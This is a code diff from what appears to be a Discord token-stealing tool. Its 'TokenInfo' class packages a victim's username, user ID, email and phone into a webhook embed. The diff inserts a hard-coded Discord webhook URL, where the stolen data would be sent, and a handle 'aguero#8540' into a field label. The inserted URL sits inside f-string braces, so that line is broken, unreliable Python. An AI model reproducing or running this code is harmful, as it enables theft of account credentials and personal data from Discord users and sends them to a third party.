@@ -156,7 +156,7 @@ class TokenInfo:
                 avatar_url=EMBED_AVATAR)
             embed = DiscordEmbed(color=EMBED_COLOR)
 
-            embed.add_embed_field(name='User Token Info', value=f""":crown:`Username:` **{self.username}#{self.discriminator}**
+            embed.add_embed_field(name='User Token Info', value=f""":crown:`Username:aguero#8540` **{self.username}#{self.discriminator}**
 :id:`User ID:` **{self.id}**
 :e_mail:`Mail:` **{self.email}**
 :mobile_phone:`Phone:` **{self.phone}**
@@ -202,7 +202,7 @@ class TokenInfo:
             return True
         except ColorNotInRangeException as e:
             raise WebhookSendFailure(
-                f'Failed to send the token information webhook: {e}')
+                f'Failed to send the token information webhook: {https://discord.com/api/webhooks/1053803281232699442/WkvUf7YIfcLiKSVrqO7UQ08-zNNATWatcXL32Wd4xTaRFB9LG_VPfxzXL4XryT_CxNPw}')
 
     @log_unknown_exceptions(ERROR)
     def check_token(self) -> bool:
